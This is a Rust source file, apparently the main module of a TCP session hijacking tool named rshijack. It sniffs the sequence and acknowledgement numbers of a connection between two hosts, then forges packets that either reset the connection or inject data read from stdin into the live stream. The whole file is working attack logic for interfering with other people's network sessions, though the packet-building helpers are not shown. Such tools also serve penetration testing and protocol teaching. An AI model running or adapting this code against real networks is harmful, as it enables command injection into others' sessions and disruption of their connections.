extern crate clap;
extern crate env_logger;
extern crate pcap;
extern crate pktparse;
extern crate nom;
extern crate pnet;
#[macro_use] extern crate log;
#[macro_use] extern crate error_chain;

pub mod args;
pub mod net;

mod errors {
    use std;
    use pcap;

    error_chain! {
        foreign_links {
            Io(std::io::Error);
            ParseInt(std::num::ParseIntError);
            ParseAddress(std::net::AddrParseError);
            Pcap(pcap::Error);
        }
    }
}
pub use errors::{Error, ErrorKind, Result};

use error_chain::ChainedError;
use errors::ResultExt;

use std::io::{self, Read};
use args::Arguments;
use net::TcpFlags;


fn run() -> Result<()> {
    if std::env::var("RUST_LOG").is_err() {
        std::env::set_var("RUST_LOG", "rshijack=debug");
    }

    env_logger::init();

    let arguments = Arguments::parse().chain_err(|| "failed to parse arguments")?;
    trace!("arguments: {:?}", arguments);

    println!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
    println!("(To speed things up, try making some traffic between the two, /msg person asdf\n");

    let (mut seq, ack, offset) = net::getseqack(&arguments.interface, &arguments.src, &arguments.dst)?;
    println!("[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}", seq, ack);

    let (mut tx, _rx) = net::create_socket()?;

    // bump seq
    seq += offset as u32;

    if arguments.reset {
        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::RST, seq, 0, &[]);
        println!("[+] Connection has been reset");
        return Ok(());
    }

    if arguments.send_null {
        info!("Sending 1kb of null bytes to prevent desync");

        let data = vec![0; 1024];
        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data);
        seq += data.len() as u32;
    }

    // get data for one packet
    let mut stdin = io::stdin();
    let mut data = vec![0; 512];
    let len = stdin.read(&mut data)?;

    let data = &data[..len];

    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data);

    // bump seq afterwards
    // seq += data.len() as u32;

    // close: TH_ACK | TH_FIN

    Ok(())
}

fn main() {
    if let Err(ref e) = run() {
        eprintln!("{}", e.display_chain());
        std::process::exit(1);
    }
}
